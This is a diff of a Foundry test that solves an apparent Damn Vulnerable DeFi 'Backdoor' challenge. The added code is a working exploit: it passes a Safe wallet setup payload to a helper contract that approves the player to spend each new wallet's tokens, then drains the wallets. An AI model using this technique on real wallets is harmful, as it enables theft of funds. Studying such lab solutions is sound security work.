@@ -4,9 +4,11 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,45 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        uint256 amount = 10e18;
+        Attacker attacker = new Attacker();
+        for (uint256 i; i < 4; i++) {
+            address[] memory usr = new address[](1);
+            usr[0] = users[i];
+            bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                usr, // address[] - array of owner addresses
+                1, // uint256 - number of required confirmations
+                address(attacker), // address - destination address for initial transaction
+                abi.encodeWithSignature("attack(address,address,uint256)", address(token), player, amount), // bytes - data payload for initial transaction
+                address(0), // address - handler for fallback calls
+                address(0), // address - token that should be used for payment
+                0, // uint256 - payment amount
+                recovery // address - address that should receive the payment
+            );
+
+            uint256 salt = 42;
+            IProxyCreationCallback callback = IProxyCreationCallback(address(walletRegistry));
+            bytes memory deploymentData =
+                abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+
+            uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(salt, callback)));
+            bytes32 saltData = keccak256(abi.encodePacked(keccak256(initializer), saltNonceWithCallback));
+
+            address proxy = address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(bytes1(0xff), address(walletFactory), saltData, keccak256(deploymentData))
+                        )
+                    )
+                )
+            );
+
+            walletFactory.createProxyWithCallback(address(singletonCopy), initializer, salt, callback);
+
+            token.transferFrom(proxy, recovery, amount);
+        }
     }
 
     /**
@@ -92,5 +132,11 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attacker {
+    function attack(address token, address spender, uint256 amount) external {
+        DamnValuableToken(token).approve(spender, amount);
     }
 }
